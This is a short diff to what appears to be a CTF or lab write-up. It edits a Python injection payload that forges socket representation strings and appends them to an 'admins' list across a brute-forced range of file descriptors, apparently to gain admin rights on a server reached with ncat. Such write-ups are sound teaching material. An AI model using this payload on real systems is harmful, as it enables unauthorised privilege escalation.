@@ -92,5 +92,5 @@ Note: the file descriptor our os would assign to the socket opened by ncat could
 i.e.
 
 ```python
-[admins.append("<socket.socket fd=" + str(i) + ", family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.49.164.56', 8000), raddr=('192.168.247.244', 50072)>") for i in range(3, 15)]
+[admins.append("<socket.socket fd=" + str(i) + ", family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.49.164.56', 8000), raddr=('192.168.247.244', 50072)>") for i in range(3, 100)]
 ```
